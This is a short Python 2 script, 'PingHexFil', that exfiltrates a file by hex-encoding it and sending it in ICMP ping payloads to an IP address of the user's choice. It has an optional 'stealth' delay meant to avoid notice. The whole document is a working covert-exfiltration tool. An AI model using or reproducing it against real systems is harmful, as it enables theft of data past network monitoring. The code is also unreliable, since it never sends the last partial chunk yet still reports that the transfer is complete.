#!/usr/bin/python
# Let's ping.
# 2019 WeakNetLabs@Gmail.com, Douglas Berdeaux
# super specific here:
from sys import argv
from scapy.layers.inet import IP,ICMP
from scapy.sendrecv import send
from sys import argv
import time
import re
import os
import binascii # bytes to hex for file input
fileData = "" # read in file and send via ping, less than 60kB
stealth=False # boolean for enabling stealth mode
# User-defined function to print usage and exit
def usage():
	usageMsg="""
 PingHexFil - Transmitter
 2019 WeakNetLabs
 Usage: ./pinghexfil.py (IP ADDRESS) (FILE NAME) [optional: ](--stealth)]
"""
	print usageMsg
	exit(1)
# User defined function to send data packet:
def sendData(fileData,dstIp):
	if(stealth):
		time.sleep(1) # one second
	send(IP(dst=dstIp)/ICMP()/fileData, verbose=False)
	print "[+] "+str(len(fileData))+" bytes sent via ICMP." # done.
# User-defined function to get file length in bytes
def fileDetails(fileName):
	byteCount=os.path.getsize(fileName)
	print "[+] The file "+fileName+" is "+str(byteCount)+" bytes."
	print "[+] This will require: "+str(byteCount/30000)+" packets to transmit."
	raw_input("[+] Start the listener with count of "+str(byteCount/30000)+", hit ENTER when ready ... ")

# And finally, the workflow:
if (len(argv)<3): # we require an IP
	usage()
else: # The IP address checks out?:
	if (re.search("^([12]?[0-9]?[0-9]+\.){3}[12]?[0-9]?[0-9]+$",argv[1])):
		dstIp=argv[1]
	if (len(argv)>3):
		if(argv[3]=="--stealth"):
			stealth=True
fileName=argv[2]
print "[+] Opening file: "+fileName
fileDetails(fileName) # get file details and wait for input

byteCount=0 # This will be a counter token
packetCount=0 # token for how many ICMP requests we make
with open(fileName,'rb') as byte:
	hexByte = byte.read(1) # create a hax value of the byte
	while (hexByte != ""):
		byteCount+=1 # increment counter
		fileData += binascii.hexlify(hexByte) # append the "hexlified" byte to string
		if (byteCount==30000): # check string length, we can only send 60kB of data in packet
			sendData(fileData,dstIp) # send it
			packetCount+=1
			fileData = "" # reset the fileData string
			byteCount=0
		hexByte=byte.read(1)
print "[+] File exfiltration complete."
print "[+] "+str(packetCount)+" ICMP packets sent."
